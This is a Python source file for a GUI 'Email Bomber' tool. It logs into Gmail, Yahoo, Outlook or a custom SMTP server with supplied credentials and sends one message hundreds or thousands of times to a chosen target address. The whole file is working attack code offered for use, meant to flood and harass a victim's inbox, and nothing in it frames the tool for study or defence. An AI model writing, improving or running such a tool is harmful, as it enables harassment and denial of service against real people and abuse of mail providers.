import smtplib
import sys
import tkinter as tk
from tkinter import messagebox

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'

class EmailBomberGUI:
    def __init__(self, master):
        self.master = master
        self.master.title("Email Bomber v1.0")

        self.target_label = tk.Label(master, text="Enter target email:")
        self.target_label.pack()

        self.target_entry = tk.Entry(master)
        self.target_entry.pack()

        self.mode_label = tk.Label(master, text="Enter BOMB mode (1,2,3,4):\n1:(1000) 2:(500) 3:(250) 4:(custom)")
        self.mode_label.pack()

        self.mode_entry = tk.Entry(master)
        self.mode_entry.pack()

        self.start_button = tk.Button(master, text="Start Bombing", command=self.start_bombing)
        self.start_button.pack()

    def start_bombing(self):
        target_email = self.target_entry.get()
        bomb_mode = self.mode_entry.get()

        if not target_email or not bomb_mode:
            messagebox.showerror("Error", "Please enter both target email and bomb mode.")
            return

        bomb = EmailBomber(target_email, bomb_mode)
        bomb.bomb()
        bomb.email()
        bomb.attack()

class EmailBomber:
    count = 0

    def __init__(self, target, mode):
        try:
            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
            self.target = target
            self.mode = mode
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
            self.amount = None
            if self.mode == '1':
                self.amount = 1000
            elif self.mode == '2':
                self.amount = 500
            elif self.mode == '3':
                self.amount = 250
            else:
                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
            print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
            self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))

            if default_port:
                self.port = 587

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <: '))
            self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
            self.message = str(input(bcolors.GREEN + 'Enter message <: '))

            self.msg = f'''From: {self.fromAddr}\nTo: {self.target}\nSubject: {self.subject}\n{self.message}\n'''
            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(bcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
        sys.exit(0)

if __name__ == '__main__':
    root = tk.Tk()
    app = EmailBomberGUI(root)
    root.mainloop()
